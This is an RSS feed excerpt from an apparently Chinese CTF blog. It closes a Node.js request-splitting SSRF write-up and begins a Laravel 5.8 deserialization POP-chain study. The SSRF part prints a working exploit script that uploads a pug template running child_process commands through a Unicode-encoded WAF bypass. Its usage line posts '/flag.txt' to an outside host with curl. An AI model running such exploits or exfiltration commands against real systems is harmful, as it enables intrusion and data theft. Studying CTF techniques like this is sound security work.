&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">r&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;http://a4d0ae70-d877-43de-8158-ed2b3c8fcb75.node4.buuoj.cn:81/core?q=&amp;#39;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">urllib&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">parse&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">quote&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">r&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>将会构造出这种玩意&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211206133631155.png" alt="image-20211206133631155">&lt;/p>
&lt;p>另外pug模板除了包含flag.txt以外还可以跟上面nullcon的题一样用curl请求来外带flag；稍微修改一下exp即可&lt;/p>
&lt;p>放一下&lt;a href="https://blog.5am3.com/2020/02/11/ctf-node1/#%E8%87%AA%E5%B7%B1%E5%87%BA%E7%9A%84-node-game">官方exp.py&lt;/a>&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">requests&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">sys&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">payloadRaw&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;x HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">POST /file_upload HTTP/1.1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Host: localhost:8081
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:72.0) Gecko/20100101 Firefox/72.0
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Accept-Encoding: gzip, deflate
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Type: multipart/form-data; boundary=---------------------------12837266501973088788260782942
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Length: 6279
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Origin: http://localhost:8081
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Connection: close
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Referer: http://localhost:8081/?action=upload
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Upgrade-Insecure-Requests: 1
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">-----------------------------12837266501973088788260782942
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Disposition: form-data; name=&amp;#34;file&amp;#34;; filename=&amp;#34;5am3_get_flag.pug&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">Content-Type: ../template
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">- global.process.mainModule.require(&amp;#39;child_process&amp;#39;).execSync(&amp;#39;evalcmd&amp;#39;)
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">-----------------------------12837266501973088788260782942--
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#d88200">&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">getParm&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34; &amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C4%A0&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C4%8D%C4%8A&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#8045ff">\&amp;#34;&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C4%A2&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;#39;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C4%A7&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;`&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%A0&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;!&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C4%A1&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;+&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%2B&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%3B&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;amp;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%26&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75715e"># Bypass Waf&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;global&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%A7%C5%AC%C5%AF%C5%A2%C5%A1%C5%AC&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;process&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;mainModule&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%AD%C5%A1%C5%A9%C5%AE%C5%8D%C5%AF%C5%A4%C5%B5%C5%AC%C5%A5&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;require&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%B2%C5%A5%C5%B1%C5%B5%C5%A9%C5%B2%C5%A5&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%B2%C5%AF%C5%AF%C5%B4&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;child_process&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%A3%C5%A8%C5%A9%C5%AC%C5%A4%C5&lt;/span>&lt;span style="color:#d88200">%9F&lt;/span>&lt;span style="color:#d88200">%C5%B0%C5%B2%C5%AF%C5%A3%C5%A5%C5%B3%C5%B3&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;exec&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#d88200">&amp;#34;%C5%A5%C5%B8%C5%A5%C5%A3&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">payloadC&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payloadRaw&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">replace&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;evalcmd&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">urlC&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;/core?q=&amp;#34;&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#111">getParm&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payloadC&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">urlC&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">requests&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">get&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">url&lt;/span>&lt;span style="color:#f92672">+&lt;/span>&lt;span style="color:#d88200">&amp;#34;/?action=5am3_get_flag&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">text&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">__name__&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">targetUrl&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">cmd&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">argv&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">]&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">print&lt;/span> &lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">targetUrl&lt;/span>&lt;span style="color:#111">,&lt;/span>&lt;span style="color:#111">cmd&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># python exp.py http://127.0.0.1:8081 &amp;#34;curl eval.com -X POST -d `cat /flag.txt`&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;hr>
&lt;p>实不相瞒，我被部分编码时应该编哪一些这个问题困扰了一天，经历了n次的环境崩溃和好多好多令人无语的情况；其实用全编码就是最简单快捷的，但是还是想自己折腾一下&lt;/p>
&lt;p>这个系列下一篇应该是HTTP请求走私或者是302跳转ssrf相关的，不过近期应该是不会再碰js了，垃圾Node.js，毁我青春&lt;/p>
&lt;hr>
&lt;details>
&lt;summary>
&lt;h4 class="inline">
以下是本文中涉及到的 和我学习时看过的所有文章的链接🔗 每日感谢互联网的丰富资源（
&lt;/h4>
&lt;/summary>
&lt;p>&lt;a href="https://capec.mitre.org/data/definitions/220.html">CAPEC-220: Client-Server Protocol Manipulation&lt;/a> | &lt;a href="https://capec.mitre.org/data/definitions/105.html">CAPEC-105: HTTP Request Splitting&lt;/a> | &lt;a href="https://capec.mitre.org/data/definitions/33.html">CAPEC-33: HTTP Request Smuggling&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/nodejs/node/commit/dd20c0186f">http: add &amp;ndash;security-revert for CVE-2018-12116&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.rfk.id.au/blog/entry/security-bugs-ssrf-via-request-splitting/">Security Bugs in Practice: SSRF via Request Splitting&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://github.com/Hpd0ger/My_ctf_challenge/tree/master/Isoon2019-Membershop">Membershop - docker&lt;/a> | &lt;a href="https://github.com/nullcon/hackim-2020/tree/master/web/split_second">Split second - docker&lt;/a> | &lt;a href="https://github.com/5am3/My-CTF-Challenges/tree/master/2020-icq-gys">Node Game - docker&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://infosecwriteups.com/nodejs-ssrf-by-response-splitting-asis-ctf-finals-2018-proxy-proxy-question-walkthrough-9a2424923501">Proxy-Proxy - wp&lt;/a> | &lt;a href="https://www.wolai.com/ctfhub/hj3e9WMu8X4ePZ3sADXfsH">Membershop - wp&lt;/a> | &lt;a href="https://ctftime.org/writeup/18293">Split second - wp1&lt;/a> | &lt;a href="https://r3billions.com/writeup-split-second/">Split second - wp2&lt;/a> | &lt;a href="https://blog.p6.is/nullcon-hackim-2020-split-second/">Split second - wp3&lt;/a> | &lt;a href="https://www.zhaoj.in/read-6462.html">Node Game - wp&lt;/a>&lt;/p>
&lt;/details></description></item><item><title>Laravel-5.8.x反序列化pop链学习</title><link>https://amiaaaz.github.io/2021/12/04/laravel-5.8.x-pop-gadgets/</link><pubDate>Sat, 04 Dec 2021 14:11:02 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/04/laravel-5.8.x-pop-gadgets/</guid><description>&lt;p>亲自从头到尾跟了一下涉及到的三个链子，稍微拯救了一点点点点我稀烂的代码审计能力&lt;/p>
&lt;p>参考链接放在文末&lt;/p>
&lt;hr>
&lt;h2 id="链子1---文件包含任意文件读取">链子1 - 文件包含/任意文件读取&lt;/h2>
&lt;p>搜索&lt;code>__desturct()&lt;/code>找入手点， vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/TagAwareAdapter.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203153626429.png" alt="image-20211203153626429">&lt;/p>
&lt;p>它调用了&lt;code>commit()&lt;/code>和&lt;code>invalidateTags()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203164858978.png" alt="image-20211203164858978">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203164931565.png" alt="image-20211203164931565">&lt;/p>
&lt;p>调用pool的&lt;code>saveDeferred()&lt;/code>方法，我们在这个类相同命名空间(Symfony\Component\Cache\Adapter)下找有没有别的类也实现了这个方法，另外开始的那个pool是在Adapter接口下，所以要找一个AdapterInterface接口并且存在&lt;code>saveDeferred()&lt;/code>的类&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165435637.png" alt="image-20211203165435637">&lt;/p>
&lt;p>找到这里vendor/symfony/symfony/src/Symfony/Component/Cache/Adapter/PhpArrayAdapter.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165151335.png" alt="image-20211203165151335">&lt;/p>
&lt;p>它又调用了initialize()，跟进 vendor/symfony/symfony/src/Symfony/Component/Cache/Traits/PhpArrayTrait.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165212155.png" alt="image-20211203165212155">&lt;/p>
&lt;p>是我们的文件包含点了，可以从这里读flag&lt;/p>
&lt;p>接下来就是构造exp了，要注意命名空间和接口&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203170050397.png" alt="image-20211203170050397">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203170036701.png" alt="image-20211203170036701">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203170020908.png" alt="image-20211203170020908">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211203165959349.png" alt="image-20211203165959349">&lt;/p>
&lt;p>前两个类都是Symfony\Component\Cache\Adapter命名空间下的，但是CacheItem是Symfony\Component\Cache下的，所以要再引入它，use&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">CacheItem&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\Adapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Symfony\Component\Cache\CacheItem&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">PhpArrayAdapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$file&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;/flag&amp;#39;&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">TagAwareAdapter&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$deferred&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$pool&lt;/span>&lt;span style="color:#111">;&lt;/span>
